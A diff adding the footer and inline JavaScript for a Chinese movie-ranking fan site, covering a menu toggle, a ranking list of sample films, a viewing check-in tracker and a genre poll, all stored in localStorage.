+      <div class="ft-col"><h5>榜单导航</h5><a href="#board">🔥 实时榜单</a><a href="#gen">🎬 类型专题</a><a href="#tape">📅 本周片单</a><a href="#streak">✅ 观片打卡</a><a href="#facts">💡 影史冷知识</a><a href="#poll">🗳 话题投票</a></div>
+      <div class="ft-col"><h5>热门类型</h5><a href="#">犯罪悬疑</a><a href="#">科幻脑洞</a><a href="#">恐怖惊悚</a><a href="#">动作爽片</a><a href="#">文艺慢片</a><a href="#">动画国漫</a></div>
+      <div class="ft-col"><h5>关于本站</h5><a href="#">📄 关于我们</a><a href="#">📊 榜单规则</a><a href="#">📧 编辑部投稿</a><a href="#">🤝 合作与转载</a><a href="#">🔗 友情链接</a></div>
+    </div>
+    <div class="ft-bot">
+      <div>© 2026 给力电影网 geilidianyingwang-zh.github.io 版权所有 · 片单与评分均为示例内容 · 本站不提供影视资源</div>
+      <div><a href="#">免责声明</a><a href="#">隐私政策</a><a href="#">投稿须知</a></div>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+var b=document.getElementById('burger'),n=document.getElementById('nav');
+b.addEventListener('click',function(){n.classList.toggle('open');});
+n.addEventListener('click',function(e){if(e.target.tagName==='A')n.classList.remove('open');});
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=a.getAttribute('href');
+    if(id.length>1){var el=document.querySelector(id);if(el){e.preventDefault();window.scrollTo({top:el.offsetTop-80,behavior:'smooth'});}}
+  });
+});
+
+/* 榜单 */
+var list=[
+  {n:'破案的第十三种解法',s:9.2,y:'2026',t:'犯罪'},
+  {n:'最后一个离开的人',s:8.8,y:'2025',t:'科幻'},
+  {n:'雪线之上',s:8.5,y:'2026',t:'动作'},
+  {n:'一封寄不出的信',s:8.9,y:'2024',t:'文艺'},
+  {n:'山海异闻录',s:9.0,y:'2026',t:'动画'},
+  {n:'在秋天开始',s:8.3,y:'2025',t:'爱情'}
+];
+var rows=document.getElementById('rows'),d=new Date();
+document.getElementById('bd').textContent='更新于 '+d.getMonth()+1+'/'+d.getDate();
+var gold=['g1','g2','g3'],cap=['实时榜首','上周爆冷','新片黑马'];
+list.forEach(function(v,i){
+  if(i<3){document.getElementById(gold[i]).textContent=v.n;document.getElementById('y'+gold[i].slice(1)).textContent=v.y;}
+  var up=i<2||i==4;
+  var r=document.createElement('div');r.className='row'+(up?' up':'');
+  r.innerHTML='<span class="rk">'+(i+1)+'</span><div class="tx"><b>'+v.n+'</b><p>'+v.t+' · '+v.y+'</p></div><span class="sc">'+v.s.toFixed(1)+'<small>'+(up?'▲ UP':'▽ HOLD')+'</small></span>';
+  rows.appendChild(r);
+});
+
+/* 打卡 */
+var grid=document.getElementById('grid'),cv=document.getElementById('cv'),mx=document.getElementById('mx'),tt=document.getElementById('tt');
+for(var i=0;i<7;i++){var c=document.createElement('div');c.dataset.i=i;c.title='周'+(i+1);c.addEventListener('click',tap);grid.appendChild(c);}
+var ls=localStorage.getItem('gl_days');days=ls?JSON.parse(ls):[0,0,0,0,0,0,0];
+var lst=localStorage.getItem('gl_total');total=lst?parseInt(lst,10):0;
+var lstodo=localStorage.getItem('gl_todo');todos=lstodo?JSON.parse(lstodo):[0,0,0,0,0,0];
+var tlis=document.querySelectorAll('#todo li');
+function paint(){
+  var c=0,run=0,best=0;
+  for(var i=0;i<7;i++){var el=grid.children[i];el.classList.toggle('on',!!days[i]);if(days[i]){c++;run++;if(run>best)best=run;}else run=0;}
+  cv.textContent=c;mx.textContent=Math.max(best,parseInt(localStorage.getItem('gl_best')||0,10));
+  if(parseInt(localStorage.getItem('gl_best')||0,10)<best)localStorage.setItem('gl_best',best);
+  tt.textContent=total;
+  tlis.forEach(function(li,i){li.classList.toggle('done',!!todos[i]);});
+}
+function tap(e){
+  var i=+this.dataset.i;
+  if(days[i]){days[i]=0;total=Math.max(0,total-1);}
+  else{days[i]=1;total++;}
+  localStorage.setItem('gl_days',JSON.stringify(days));localStorage.setItem('gl_total',total);paint();
+}
+paint();
+tlis.forEach(function(li,i){
+  li.addEventListener('click',function(){
+    todos[i]=todos[i]?0:1;localStorage.setItem('gl_todo',JSON.stringify(todos));paint();
+  });
+});
+
+/* 投票 */
+var opts=['犯罪悬疑：烧脑反转','科幻脑洞：硬核设定','动作爽片：实拍特技','文艺慢片：长镜头','动画国漫：视效创新','恐怖惊悚：心理压迫'];
+var ov=localStorage.getItem('gl_poll');poll=ov?JSON.parse(ov):[0,0,0,0,0,0];
+var pick=localStorage.getItem('gl_pick');
+function rnd(){return Math.floor(Math.random()*9+4);}
+if(!ov){poll=poll.map(rnd);localStorage.setItem('gl_poll',JSON.stringify(poll));}
+var box=document.getElementById('polllist');
+function draw(){
+  var sum=poll.reduce(function(a,b){return a+b;},0);
+  document.getElementById('pt').textContent=sum+' 票 · 已投 '+(pick!==null?1:0)+' 次';
+  box.innerHTML='';
+  poll.forEach(function(v,i){
+    var pct=sum?Math.round(v/sum*100):0;
+    var row=document.createElement('div');row.className='po';
+    row.innerHTML='<div class="po-h"><b>'+(i+1)+'. '+opts[i]+'</b><span>'+pct+'% ('+v+')</span></div><div class="po-bar"><i></i></div>';
+    row.addEventListener('click',function(){
+      if(pick!==null)return;
+      pick=i;poll[i]++;localStorage.setItem('gl_poll',JSON.stringify(poll));localStorage.setItem('gl_pick',i);draw();
+    });
+    box.appendChild(row);
+    setTimeout(function(b){b.style.width=pct+'%';},40+i*60,row.querySelector('i'));
+  });
+}
+draw();
+})();
+</script>
+</body>
+</html>
